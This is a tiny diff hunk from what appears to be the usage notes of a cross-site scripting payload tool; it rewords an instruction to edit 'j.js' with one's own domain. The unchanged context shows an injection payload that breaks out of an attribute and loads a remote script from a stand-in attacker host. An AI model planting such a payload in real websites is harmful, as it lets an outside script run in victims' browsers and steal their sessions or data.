@@ -6,4 +6,4 @@ Usage example:
 "'></script><script src=//www.ATTACKER.com/x/j.js></script>
 ```
 
-PS. Please edit j.js with your domain
+PS. Please modify `j.js` by adding your domain.
